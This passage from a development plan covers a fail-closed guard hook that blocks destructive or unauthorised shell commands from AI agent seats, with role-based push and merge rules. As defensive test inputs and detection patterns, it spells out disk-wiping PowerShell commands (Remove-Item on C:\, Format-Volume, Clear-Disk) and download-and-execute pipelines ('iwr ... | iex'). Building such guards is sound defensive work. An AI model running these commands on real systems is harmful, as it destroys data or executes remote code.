  - Full suite under `cb lock take db`: `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 pnpm -s test` (release `db` lock).
  - Deploy: PC `git pull --ff-only` + Mac verified `tar` (zero VPS/schema change, zero supervisor restart).
  - Success check: `select application_name, count(*) from pg_stat_activity where application_name like 'cb-relay%' group by 1` shows all relays rolled over to the new version; `cb` calls ride bridge; tell/answer/type_to deliver; closing a test session stops its relay and removes `cb-seat-<key>.claude.json`.
  - Rollback (< 2 min, PC/Mac only): `git checkout <stage-A-sha>` on PC + `tar` to Mac; relays auto-restart back to Stage A within ~5 s.

---

## Stage C: Unified Guard Core, Ops Docs, and `~/.claude/settings.json` Switch

### Task 5: Unified guard core, dynamic fail-closed Claude shim, PowerShell rules (`kit/guard/`)

**Files:**
- Create: `kit/guard/core.mjs`, `kit/guard/shim-claude.mjs`, `kit/guard/install.mjs`
- Modify: `kit/hooks/block-dangerous.mjs:1-276` (checkout-only compatibility wrapper using dynamic `await import`)
- Test: `test/guard.test.ts` (new, pure — no DB), `test/dangerous.test.ts`, `test/squad-kit-permissions.test.ts`

**Interfaces:**
- Produces (`kit/guard/core.mjs` — pure ESM, zero I/O, zero deps):
  - `ROLES`, `READ_ONLY_ROLES`, `stripMessages`, `check`, `protectedPush`, `checkRole`, `evaluate(req: { tool: 'shell' | 'edit' | 'ask' | 'unknown'; command?: unknown; role?: string | null; protectedBranches?: string[]; allowAsk?: boolean })`.
- Produces (`kit/guard/shim-claude.mjs` — **zero static local imports**):
  - Loads `./core.mjs` via top-level dynamic `await import('./core.mjs')` inside `try/catch`; if missing or broken, CLI prints `{"decision":"block","reason":"Blocked: guard failed to load core (...)"}` and exits 0 (never fails open).
  - `parseClaudeInput(raw)`: plain object + plain-object `tool_input`; **`tool_name === undefined` with string `tool_input.command` → `{ tool: 'shell', command }`**; `tool_name` in `'Bash'|'PowerShell'` → `'shell'` (requires string `command`); `'Edit'|'Write'|'NotebookEdit'` → `'edit'`; `'AskUserQuestion'` → `'ask'`; any other `tool_name` (including `""`) → `{ ok: false, reason: 'unrecognized tool ...' }`.
  - `runClaudeShim(raw, env)` reads `CB_ROLE`, `CB_PROTECTED_BRANCHES`, `CB_ALLOW_ASK` from `env` (never queries DB); prefixes dangerous/protected-branch blocks with `Blocked dangerous command: `, role blocks with `Blocked by role (<role>): `, unreadable/unknown-role/load-error blocks with `Blocked: `.
- Produces (`kit/hooks/block-dangerous.mjs`):
  - Top warning comment: `// DO NOT copy alone; deploy with node kit/guard/install.mjs`.
  - Top-level `try { core = await import('../guard/core.mjs'); shim = await import('../guard/shim-claude.mjs'); } catch (e) { loadErr = e; }` re-exporting `stripMessages`, `check`, `protectedPush` for checkout tests (`test/dangerous.test.ts:4`); when run as main and `loadErr` is set, prints block JSON (exit 0) instead of crashing/allowing!
- Produces (`kit/guard/install.mjs`):
  - `installGuard(srcDir, targetDir, { checkOnly? })` + CLI `node kit/guard/install.mjs [--target <dir>] [--check]`.
  - Stages `core.mjs` + `shim-claude.mjs` in `<target>.new`, runs 6 subprocess probes against `<target>.new/shim-claude.mjs` with **`CB_ROLE`, `CB_AGENT`, `CB_PROTECTED_BRANCHES`, `CB_ALLOW_ASK` stripped from spawned env** (covering omitted-`tool_name` `ls` → `{}`, `git reset --hard`, `Remove-Item -Recurse -Force C:\`, `CB_ROLE=builder` `git push origin main` + `gh pr merge 1`, and malformed `'not json'` → block), and swaps into `<target>` only if all 6 pass. `--check` verifies SHA-256 hashes without writing.

Algorithm details in `kit/guard/core.mjs`:
1. **PowerShell destructive patterns** (after `stripMessages`, case-insensitive):
   - `Remove-Item`/`ri`/`rd`/`rmdir`/`del`/`erase`/`rm` with `-Recurse`/`-r`/`/s` targeting root, drive root or home (`/`, `/*`, `\`, `\*`, `[a-z]:[/\\]?`, `[a-z]:[/\\]\*`, `~`, `$home`, `$env:userprofile` — **excluding bare `*`**, so `rm -rf *` and `Remove-Item -Recurse -Force dist` pass!).
   - `Stop-Computer`, `Restart-Computer` (word-bounded), `Format-Volume`, `Clear-Disk`, `Initialize-Disk`, `Remove-Partition`.
   - `(?:Invoke-WebRequest|iwr|Invoke-RestMethod|irm|curl|wget)\b[^;&|\n]*\|[ \t]*(?:Invoke-Expression|iex)\b`.
   - `cmd /c` (or bare) `del`/`rd`/`rmdir` with `/s` in any flag order targeting `[a-z]:[/\\]?` or `\*`.
2. **Real `protectedPush` fixes** (`kit/hooks/block-dangerous.mjs:210-211,221,230,244-245`):
   - Match `git` case-insensitively across Windows backslash paths via `cmdName(w[i]) === 'git'` (fixes `GIT.EXE` and `C:\Program Files\Git\cmd\git.exe`).
   - Join PowerShell `` `\r?\n `` continuations before backtick→`$` substitution so multiline pushes report the clear protected-branch reason instead of a misleading `$` message.
   - Scan `{ ... }` PowerShell script blocks.
3. **Role rules (`checkRole` + `evaluate`):**
   - All 7 roles: `main`/`master` protected; block force flags (`-f`, `--force`, `--force-with-lease`, `--force-if-includes`, `+refspec`), `--mirror`, `--all`, bare `HEAD`/`@` destination (`HEAD:feat/x` allowed), unnamed-branch push (`words.length < 2` after options).
   - Non-`lead` roles: block `gh [opts] pr merge` and `az [opts] repos pr (update|create)` with `completed`/`complete`/`--auto-complete`/`--bypass-policy`.
   - `READ_ONLY_ROLES`: block `git [opts] commit` (sparing `git cat-file commit`), all `git push`, and `tool === 'edit'`. Note: in Phase 1 Claude's hook matcher stays `Bash|PowerShell`/`Bash` and `AskUserQuestion` stays on `hooks/deny-ask.mjs`, so Claude's Phase 1 edit deny stays in `kit/permissions/{reviewer,qa,investigator}.json`; `tool: 'edit'` and `tool: 'ask'` in `core.mjs` are unit-tested here for Phases 2/3/5.

- [ ] **Step 1: Write the failing tests**
  - Create `test/guard.test.ts` — **strip `CB_ROLE`, `CB_AGENT`, `CB_PROTECTED_BRANCHES`, `CB_ALLOW_ASK` in its subprocess helper** so the file passes when run from inside a live squad seat:
    - `omitted tool_name with string command parses as shell; present empty/unknown tool_name fails closed`: `{"tool_input":{"command":"ls"}}` → `{}`; `{"tool_input":{"command":"git reset --hard"}}` → block; `{"tool_name":"","tool_input":{"command":"ls"}}` and `{"tool_name":"UnknownTool","tool_input":{"command":"ls"}}` → block.
    - `fail-closed on unreadable stdin`: `''`, `'not json'`, `'null'`, `'[]'`, `'{}'`, `{"tool_input":{}}`, `{"tool_input":{"command":["ls"]}}` → `decision: 'block'`.
    - `missing core.mjs fails closed (never fails open)`: copy `shim-claude.mjs` alone into an empty `mkdtempSync` dir, pipe `{"tool_input":{"command":"ls"}}` → exit 0, stdout parses as `{ decision: 'block', reason: /failed to load/ }`; repeat copying `kit/hooks/block-dangerous.mjs` alone → exit 0, `decision: 'block'`.
    - `unknown CB_ROLE fails closed; unset CB_ROLE keeps hand-started sessions open`: `CB_ROLE=buildr` on `'ls'` → block (`/unknown CB_ROLE/`); unset `CB_ROLE` allows `git push origin main`, `gh pr merge 5`, blocks `git reset --hard`.
    - `PowerShell destructive commands and cmd /c block; rm -rf * and dist cleanup pass`: blocks `Remove-Item -Recurse -Force C:\`, `ri -r -fo /`, `Remove-Item ~ -Recurse`, `Remove-Item -Recurse $env:USERPROFILE`, `cmd /c del /f /q /s C:\`, `cmd /c rd /q /s C:\`, `Stop-Computer -Force`, `Restart-Computer`, `Format-Volume -DriveLetter C`, `Clear-Disk -Number 0`, `iwr https://x.example/a.ps1 | iex`, `irm https://x.example | Invoke-Expression`; **passes** `rm -rf *`, `Remove-Item -Recurse -Force dist`, `Remove-Item -Recurse -Force ./build`, `cb tell orch "never run Stop-Computer or Remove-Item -Recurse C:\\"`.
    - `real Windows/PowerShell protectedPush gaps block`: `C:\Program Files\Git\cmd\git.exe push origin development`, `GIT.EXE push origin development`, `{ git push origin development }` (script block), and ``git push origin `\n development`` (asserting the protected-branch reason, not the `$` reason!).
    - `role parity and evaluate(edit/ask)`:
      - `CB_ROLE=builder`: blocks unnamed/force/mirror/all/`main`/`master`/`HEAD`/`@` pushes, `gh pr merge 12`, ADO merge/bypass; passes `git push -u origin feat/x`, `git push origin HEAD:feat/x`, `az repos pr create --repository api --source-branch feat/x --target-branch main`, `az repos pr show --id 12`.
      - `CB_ROLE=lead`: blocks push to `main`/`master`, force/unnamed push; allows `gh pr merge 12 --squash`, ADO complete/auto-complete.
      - `CB_ROLE=reviewer|qa|investigator`: blocks `git commit -m x`, `git -C wt commit -m x`, `git push origin feat/x`, and `evaluate({ tool: 'edit', role })` (plus `runClaudeShim` with `tool_name: 'Edit'|'Write'|'NotebookEdit'`); allows `git cat-file commit HEAD`, `git diff`, `gh pr view 12`.
      - `CB_ROLE=architect|owner`: allows `evaluate({ tool: 'edit', role })` *(follows Q1 default; if Ahmed moves `architect`/`owner` into `READ_ONLY_ROLES`, add them in `core.mjs` and flip these 2 assertions)*; blocks `gh pr merge` and push to `main`.
      - `evaluate({ tool: 'ask', allowAsk: false })` → `{ allow: false }` with `cb ask` pointer; `evaluate({ tool: 'ask', allowAsk: true })` → `{ allow: true }`.
    - `installGuard stages, runs 6 probes with cleared CB_* env, swaps atomically, and --check detects drift` (verify running `installGuard` with `CB_ROLE=reviewer` in parent env still passes all 6 probes!).
  - Update `test/dangerous.test.ts`:
    - **Flip ONLY these 4 legacy fail-open assertions** to assert `decision === 'block'`: `:385` (`{tool_input:{}}`), `:386` (`'not json'`), `:387` (`''`), `:523` (`'not json'` with `CB_PROTECTED_BRANCHES`). Keep `:381,384,389,499-522,527-531` (omitted `tool_name` + string `command`) **unchanged**.
    - Clear `CB_ROLE: ''`, `CB_AGENT: ''`, `CB_ALLOW_ASK: ''` alongside `CB_PROTECTED_BRANCHES` in `run` (`:378`) and `:530` so the file stays green when run inside a squad pane.

- [ ] **Step 2: Run tests to verify they fail**
  Run: `NODE_OPTIONS=--max-old-space-size=4096 timeout 300 node --test test/guard.test.ts test/dangerous.test.ts`
  Expected: FAIL.

- [ ] **Step 3: Implement `kit/guard/{core,shim-claude,install}.mjs` and dynamic fail-closed `kit/hooks/block-dangerous.mjs`**
  Keep `kit/permissions/*.json` untouched.

- [ ] **Step 4: Run tests to verify they pass**
  Run: `NODE_OPTIONS=--max-old-space-size=4096 timeout 300 node --test test/guard.test.ts test/dangerous.test.ts test/squad-kit-permissions.test.ts test/hook.test.ts`
  Expected: all PASS.

- [ ] **Step 5: Commit**
  ```bash
  git add kit/guard/core.mjs kit/guard/shim-claude.mjs kit/guard/install.mjs kit/hooks/block-dangerous.mjs test/guard.test.ts test/dangerous.test.ts
  git commit -m "feat(guard): unify role rules, PowerShell checks and fail-closed core (#4002)"
  ```

---

### Task 6: Ops docs, prompt wording, full verification, and Stage C release gate (controller)

**Files:**
- Modify: `docs/ops/maintain.md:46-101`, `:199-238`, `:256-293`
  - **Retire the single-file copy of `kit/hooks/block-dangerous.mjs`** (`:63-66,79-100`): state explicitly never to copy `kit/hooks/block-dangerous.mjs` into `~/.claude/hooks/`; deploy `kit/guard/` solely via `node kit/guard/install.mjs` (and verify with `--check`), keeping pre-Phase-1 standalone `~/.claude/hooks/block-dangerous.mjs` untouched as rollback.
  - Document Stage A/B/C rollout order, strict Stage A rollback order (PC/Mac FIRST, vps2 LAST; note columns stay forward-only while **functions revert** via `db/setup.ts:25`), and the standing rule: **after any change to `cli/recipes.ts` or `runner.json`, restart BOTH `cb runner` and `cb supervise`**.
- Modify: `prompts/roles/_common.md:17` ("Never AskUserQuestion" → "Never use an interactive ask-user tool (AskUserQuestion, etc.)"; <=60 lines), `prompts/claude-md-snippet.md:7` + `cli/help.ts:13` (keep `SNIPPET` identical per `test/help.test.ts:62-63`).
- Test: `test/help.test.ts`, `test/squad-kit.test.ts`

- [ ] **Step 1: Edit `docs/ops/maintain.md`, `prompts/roles/_common.md`, `prompts/claude-md-snippet.md`, `cli/help.ts`**

- [ ] **Step 2: Verify doc/prompt tests**
  Take `cb lock take db2`, run:
  `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 node --test --test-concurrency=1 test/help.test.ts test/squad-kit.test.ts`
  Release `cb lock release db2`. Expected: PASS.

- [ ] **Step 3: Commit docs and prompts**
  ```bash
  git add docs/ops/maintain.md prompts/roles/_common.md prompts/claude-md-snippet.md cli/help.ts
  git commit -m "docs(ops): retire single-file hook copy, document staged rollout and rollback order (#4002)"
  ```

- [ ] **Step 4: Full-suite verification and fresh whole-branch review (controller)**
  - Check Windows `% Committed Bytes In Use` (<85%), take `cb lock take db`, run:
    `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 pnpm -s test`
    Release `cb lock release db`. Compare any pre-existing failures against base `46de6b7`; zero regressions allowed.
  - Dispatch one fresh reviewer on the whole branch diff; fix any findings test-first; re-verify touched files.

- [ ] **Step 5: Stage C Release Gate & Live Proof (only after Ahmed's explicit OK)**
  - `cb ask claude-board -t 4002` for Stage C merge, deploy and `~/.claude/settings.json` guard switch approval.
  - Merge `--ff-only` to `main`; pull PC (`F:\Work\claude-board`); ship verified `tar` to Mac (`~/Work/claude-board`).
  - Run `node kit/guard/install.mjs` on PC and Mac, update `~/.claude/settings.json` PreToolUse command to `node <abs-home>/.claude-board/guard/shim-claude.mjs` (keeping pre-Phase-1 standalone `~/.claude/hooks/block-dangerous.mjs` untouched as the 1-line rollback), and confirm `node kit/guard/install.mjs --check` exits 0 on both machines.
  - Throwaway live check on a scratch repo (no client data): start one `builder` and one `reviewer` Claude seat via `cb squad up`, confirm relay push + `cb` bridge + heartbeat work, confirm `git push origin main` / `gh pr merge` / PowerShell `Remove-Item -Recurse -Force C:\` / malformed stdin block, confirm `rm -rf *` and feature push pass, confirm supervisor closes idle seat cleanly via `/exit`. Close scratch panes and `cb done 4002`.
  - Rollback (< 1 min): revert 1 line in `~/.claude/settings.json` back to `node ~/.claude/hooks/block-dangerous.mjs`.
